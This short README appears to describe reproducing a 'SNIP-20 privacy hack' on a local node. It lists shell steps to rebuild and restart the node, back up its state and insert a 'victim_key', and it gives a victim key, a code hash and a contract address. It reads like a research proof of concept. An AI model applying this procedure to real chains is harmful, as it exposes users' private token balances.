## SNIP-20 privacy hack
```
docker-compose down
docker system prune

./build_image.sh

sudo ./start_node.sh

./node_modules/.bin/jest -t Setup
mkdir backup
sudo cp -r secretd-2/* backup/

sudo vim backup/victim_key
sudo ./restart_node.sh
```

Update node with victim balance key specified and rebuild the node
```
./rebuild_node.sh
```

Copy the backup folder to secretd-2 everytime restart the node



victim_key: 
27bd751a70f61538ec9b7cb2c627acdf8d1f8ccd3d67b35bd500042de4330780
codeHash: 
22e8cdd3fddb5d25dfbb4e90dd904b6068297ab58ed45cfdda51552b18f9e854
contractAddress: 
secret18vd8fpwxzck93qlwghaj6arh4p7c5n8978vsyg



